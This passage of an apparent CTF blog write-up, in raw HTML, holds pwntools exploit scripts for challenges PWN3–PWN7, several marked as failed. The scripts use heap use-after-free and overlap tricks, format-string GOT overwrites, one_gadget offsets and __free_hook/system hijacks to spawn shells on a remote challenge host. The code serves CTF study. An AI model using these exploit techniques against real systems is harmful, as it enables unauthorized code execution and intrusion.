class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"219.219.61.234\",10002)</span></span><br><span class=\"line\">r = process(<span class=\"string\">\"./pwn3\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x8048986</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">\"AAAA\"</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">\"BBBB\"</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p32(magic))</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN4-fail\"><a href=\"#PWN4-fail\" class=\"headerlink\" title=\"PWN4(fail)\"></a>PWN4(fail)</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">'./pwn4'</span>)</span><br><span class=\"line\">sh = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"string\">'10003'</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\">context(arch=<span class=\"string\">'amd64'</span>,os=<span class=\"string\">'linux'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./pwn4'</span>)</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'printf'</span>]</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">key = <span class=\"string\">'3xpL0r3R'</span></span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(str(key))</span><br><span class=\"line\">payload = <span class=\"string\">'aaaa%77$p'</span><span class=\"comment\">#6</span></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'aaaa0x'</span>)</span><br><span class=\"line\">libc_base = int(int(sh.recv(<span class=\"number\">12</span>),<span class=\"number\">16</span>) - <span class=\"number\">0x20840</span>)</span><br><span class=\"line\">log.success(hex(libc_base))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">puts_addr = libc_base + libc.sym[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">log.success(hex(puts_addr))</span><br><span class=\"line\">gad_get = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf0364</span>,<span class=\"number\">0xf1207</span>]</span><br><span class=\"line\">one_addr = libc_base + gad_get[<span class=\"number\">0</span>]</span><br><span class=\"line\">log.success(hex(one_addr))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">6</span>, &#123;puts_got:one_addr&#125;)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN5-fail\"><a href=\"#PWN5-fail\" class=\"headerlink\" title=\"PWN5(fail)\"></a>PWN5(fail)</h2><p> libc libc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10004</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./pwn5\")</span></span><br><span class=\"line\">heap = ELF(<span class=\"string\">'./pwn5'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = 'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">free_got = heap.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"string\">\"/bin/sh\\x00\"</span> + <span class=\"string\">'A'</span>*<span class=\"number\">0x10</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span> + p64(<span class=\"number\">0x20</span>) + p64(heap.got[<span class=\"string\">'free'</span>]))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"Content: \"</span>)</span><br><span class=\"line\">data = r.recvuntil(<span class=\"string\">\"OK!\"</span>)</span><br><span class=\"line\">free_addr = u64(data.split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">0</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\">libc_base = free_addr -libc.symbols[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">'libc base addr:'</span>+hex(libc_base))</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">print(hex(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">1</span>,p64(system_addr))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(heap.got['free']))</span></span><br><span class=\"line\"><span class=\"comment\">#add(0x10,\"/bin/sh\\x00\")</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#delete(2)</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#delete(1)</span></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN6-fail\"><a href=\"#PWN6-fail\" class=\"headerlink\" title=\"PWN6(fail)\"></a>PWN6(fail)</h2><p>exp1:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">'./pwn6'</span>)</span><br><span class=\"line\">sh = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"string\">'10005'</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">'info'</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class=\"line\"><span class=\"comment\">#idx </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(idx,size,content)</span>:</span></span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'Choice&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">'1'</span>)</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">\"index&gt;&gt; \"</span>)</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'size&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(str(size))</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'name&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(str(content))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'Choice&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">'2'</span>)</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">\"index&gt;&gt; \"</span>)</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"> <span class=\"comment\">#sh.recvuntil('dele success')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"> sh.recv()</span><br><span class=\"line\"> sh.sendline(str(content))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">'Choice&gt;&gt; '</span>)</span><br><span class=\"line\"> sh.sendline(<span class=\"string\">'5'</span>)</span><br><span class=\"line\"> sh.recvuntil(<span class=\"string\">\"index&gt;&gt; \"</span>)</span><br><span class=\"line\"> sh.sendline(str(idx))</span><br><span class=\"line\"><span class=\"comment\">#leave message at bss</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'secret\\n'</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'aaa'</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'&gt;&gt; '</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'2'</span>)</span><br><span class=\"line\"><span class=\"comment\">#overwrite</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x130</span>, <span class=\"string\">'aa'</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x88</span>, <span class=\"string\">'aa'</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x88</span>,<span class=\"string\">'aaaaaaa'</span>)<span class=\"comment\">#edit this to ....</span></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'aaaaaaa\\x0a'</span>)</span><br><span class=\"line\"><span class=\"comment\">#sh.recv(8)</span></span><br><span class=\"line\">libc_base = u64(sh.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>)) - <span class=\"number\">0x3c4ca8</span></span><br><span class=\"line\">free_addr = libc_base + libc.sym[<span class=\"string\">'__free_hook'</span>]</span><br><span class=\"line\">malloc_addr = libc_base + libc.sym[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">log.success(hex(free_addr))</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#hide on 0</span></span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#hide on 0</span></span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#hide on 0</span></span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#h</span></span><br><span class=\"line\">add(<span class=\"number\">7</span>,<span class=\"number\">0x98</span>,<span class=\"string\">'aaa'</span>)</span><br><span class=\"line\"><span class=\"comment\">#x/30gx 0x602120 </span></span><br><span class=\"line\"><span class=\"comment\">#bss_ptr</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"number\">0x88</span> * <span class=\"string\">'a'</span> + <span class=\"string\">'\\xb1'</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"number\">0x88</span>,<span class=\"string\">'aaa'</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">payload1 = <span class=\"number\">0x20</span> * <span class=\"string\">'a'</span> + <span class=\"string\">'\\x98'</span> + <span class=\"number\">7</span> * <span class=\"string\">'\\x00'</span> + p64(free_addr)</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,payload1)</span><br><span class=\"line\"><span class=\"comment\">#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207</span></span><br><span class=\"line\">one_addr = libc_base + <span class=\"number\">0x4527a</span></span><br><span class=\"line\">payload2 = p64(one_addr)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,payload2)</span><br><span class=\"line\">delete(<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n<p>exp2:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./pwn6'</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = elf.process()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"string\">'10005'</span>)</span><br><span class=\"line\"><span class=\"comment\"># libc = ELF('libc-2.23.so')</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"><span class=\"comment\"># context.log_level = 'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">enter</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">\"important secret\"</span>,<span class=\"string\">\"ld1ng\"</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">\"&gt;&gt;\"</span>,<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(idx,size,con)</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'Your Choice&gt;&gt;'</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'index&gt;&gt;'</span>,str(idx))</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'size&gt;&gt;'</span>,str(size))</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'name&gt;&gt;'</span>,con)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(idx,con)</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'Your Choice&gt;&gt;'</span>,<span class=\"string\">'3'</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'index&gt;&gt;'</span>,str(idx))</span><br><span class=\"line\"> p.sendafter(<span class=\"string\">'name&gt;&gt;'</span>,con)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'Your Choice&gt;&gt;'</span>,<span class=\"string\">'2'</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'index&gt;&gt;'</span>,str(idx))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'Your Choice&gt;&gt;'</span>,<span class=\"string\">'5'</span>)</span><br><span class=\"line\"> p.sendlineafter(<span class=\"string\">'index&gt;&gt;'</span>,str(idx))</span><br><span class=\"line\">enter()</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">128</span>,<span class=\"string\">\"aaa\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">128</span>,<span class=\"string\">\"bbb\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">libc_base = u64(p.recvuntil(<span class=\"string\">'\\x7f'</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>)) - <span class=\"number\">88</span> - <span class=\"number\">0x10</span> -libc.sym[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">info(hex(libc_base))</span><br><span class=\"line\">sys = libc_base + libc.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">info(hex(sys))</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x88</span>,<span class=\"string\">\"ccc\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x88</span>,<span class=\"string\">\"ddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x88</span>,<span class=\"string\">\"eee\"</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">'a'</span>*<span class=\"number\">0x88</span> + <span class=\"string\">'\\xd1'</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0xc8</span>,<span class=\"string\">\"fff\"</span>)</span><br><span class=\"line\">edit(<span class=\"number\">5</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">16</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">0x88</span>)+p64(<span class=\"number\">0x602080</span>)+p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"ls\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># add(6,0x80,\"ld1ng\")</span></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(sys))</span><br><span class=\"line\"><span class=\"comment\">#p.sendline(\"ls\")</span></span><br><span class=\"line\"><span class=\"comment\">#p.sendline(\"cat flag\")</span></span><br><span class=\"line\"><span class=\"comment\"># delete(4)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN7-fail\"><a href=\"#PWN7-fail\" class=\"headerlink\" title=\"PWN7(fail)\"></a>PWN7(fail)</h2><p>&gt;<br>&gt;<br>&gt;</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 